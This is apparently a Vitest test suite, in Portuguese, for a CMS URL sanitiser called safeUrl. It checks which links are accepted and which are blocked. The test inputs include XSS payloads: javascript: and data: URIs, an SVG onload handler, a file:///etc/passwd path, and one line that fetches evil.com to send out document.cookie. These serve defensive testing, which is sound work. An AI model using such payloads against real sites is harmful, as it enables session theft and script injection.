import { describe, it, expect } from 'vitest';
import { safeUrl } from '@/lib/cms-v2/safe-url';

describe('safeUrl', () => {
  // ── Entradas vazias / falsy ──
  describe('entradas vazias e falsy', () => {
    it('retorna string vazia para undefined', () => {
      expect(safeUrl(undefined)).toBe('');
    });

    it('retorna string vazia para string vazia', () => {
      expect(safeUrl('')).toBe('');
    });

    it('retorna string vazia para string com apenas espacos', () => {
      expect(safeUrl('   ')).toBe('');
    });

    it('retorna string vazia para string com tabs e newlines', () => {
      expect(safeUrl('\t\n  ')).toBe('');
    });
  });

  // ── URLs HTTPS/HTTP validas ──
  describe('URLs HTTP e HTTPS validas', () => {
    it('aceita URL https comum', () => {
      expect(safeUrl('https://acm.org.br')).toBe('https://acm.org.br');
    });

    it('aceita URL http comum', () => {
      expect(safeUrl('http://example.com')).toBe('http://example.com');
    });

    it('aceita URL https com path e query', () => {
      const url = 'https://acm.org.br/eventos?page=1&sort=date';
      expect(safeUrl(url)).toBe(url);
    });

    it('aceita URL https com fragmento', () => {
      const url = 'https://acm.org.br/sobre#equipe';
      expect(safeUrl(url)).toBe(url);
    });

    it('aceita URL com porta', () => {
      const url = 'https://localhost:3000/api';
      expect(safeUrl(url)).toBe(url);
    });

    it('faz trim de espacos ao redor', () => {
      expect(safeUrl('  https://acm.org.br  ')).toBe('https://acm.org.br');
    });
  });

  // ── URLs relativas e anchors ──
  describe('URLs relativas e anchors', () => {
    it('aceita path relativo', () => {
      expect(safeUrl('/sobre')).toBe('/sobre');
    });

    it('aceita path relativo com multiplos segmentos', () => {
      expect(safeUrl('/eventos/2026/maio')).toBe('/eventos/2026/maio');
    });

    it('aceita anchor', () => {
      expect(safeUrl('#contato')).toBe('#contato');
    });

    it('aceita anchor com path complexo', () => {
      expect(safeUrl('#section-2-details')).toBe('#section-2-details');
    });
  });

  // ── Protocolos mailto e tel ──
  describe('protocolos mailto e tel', () => {
    it('aceita mailto', () => {
      expect(safeUrl('mailto:contato@acm.org.br')).toBe('mailto:contato@acm.org.br');
    });

    it('aceita tel', () => {
      expect(safeUrl('tel:+5548999190401')).toBe('tel:+5548999190401');
    });
  });

  // ── BLOQUEIO XSS: javascript: ──
  describe('bloqueio XSS - javascript:', () => {
    it('bloqueia javascript:alert(1)', () => {
      expect(safeUrl('javascript:alert(1)')).toBe('');
    });

    it('bloqueia javascript:alert("XSS")', () => {
      expect(safeUrl('javascript:alert("XSS")')).toBe('');
    });

    it('bloqueia JAVASCRIPT: (case insensitive)', () => {
      expect(safeUrl('JAVASCRIPT:alert(1)')).toBe('');
    });

    it('bloqueia JavaScript: (mixed case)', () => {
      expect(safeUrl('JavaScript:void(0)')).toBe('');
    });

    it('bloqueia jAvAsCrIpT: (alternating case)', () => {
      expect(safeUrl('jAvAsCrIpT:alert(document.cookie)')).toBe('');
    });

    it('bloqueia javascript: com espacos no inicio', () => {
      expect(safeUrl('  javascript:alert(1)  ')).toBe('');
    });

    it('bloqueia javascript: com payload complexo', () => {
      expect(safeUrl('javascript:fetch("https://evil.com/steal?c="+document.cookie)')).toBe('');
    });

    it('bloqueia javascript:void(0)', () => {
      expect(safeUrl('javascript:void(0)')).toBe('');
    });
  });

  // ── BLOQUEIO XSS: data: ──
  describe('bloqueio XSS - data:', () => {
    it('bloqueia data:text/html', () => {
      expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
    });

    it('bloqueia data:text/html;base64', () => {
      expect(safeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBe('');
    });

    it('bloqueia DATA: (case insensitive)', () => {
      expect(safeUrl('DATA:text/html,<h1>evil</h1>')).toBe('');
    });

    it('bloqueia data:image/svg+xml com script', () => {
      expect(safeUrl('data:image/svg+xml,<svg onload="alert(1)"/>')).toBe('');
    });
  });

  // ── BLOQUEIO XSS: vbscript: ──
  describe('bloqueio XSS - vbscript:', () => {
    it('bloqueia vbscript:MsgBox', () => {
      expect(safeUrl('vbscript:MsgBox("XSS")')).toBe('');
    });

    it('bloqueia VBSCRIPT: (case insensitive)', () => {
      expect(safeUrl('VBSCRIPT:MsgBox("XSS")')).toBe('');
    });
  });

  // ── BLOQUEIO: protocol-relative URLs ──
  describe('bloqueio protocol-relative URLs', () => {
    it('bloqueia //evil.com', () => {
      expect(safeUrl('//evil.com')).toBe('');
    });

    it('bloqueia //evil.com/steal', () => {
      expect(safeUrl('//evil.com/steal?cookie=abc')).toBe('');
    });
  });

  // ── BLOQUEIO: esquemas desconhecidos ──
  describe('bloqueio esquemas desconhecidos', () => {
    it('bloqueia ftp:', () => {
      expect(safeUrl('ftp://files.example.com')).toBe('');
    });

    it('bloqueia file:', () => {
      expect(safeUrl('file:///etc/passwd')).toBe('');
    });

    it('bloqueia custom-scheme:', () => {
      expect(safeUrl('myapp://deeplink/page')).toBe('');
    });

    it('bloqueia string sem protocolo nem barra', () => {
      expect(safeUrl('evil.com')).toBe('');
    });

    it('bloqueia string aleatoria', () => {
      expect(safeUrl('not-a-url-at-all')).toBe('');
    });
  });

  // ── Caracteres especiais e unicode ──
  describe('caracteres especiais e unicode', () => {
    it('aceita URL https com caracteres unicode', () => {
      const url = 'https://example.com/p%C3%A1gina';
      expect(safeUrl(url)).toBe(url);
    });

    it('aceita path relativo com acentos encoded', () => {
      expect(safeUrl('/caf%C3%A9')).toBe('/caf%C3%A9');
    });
  });
});
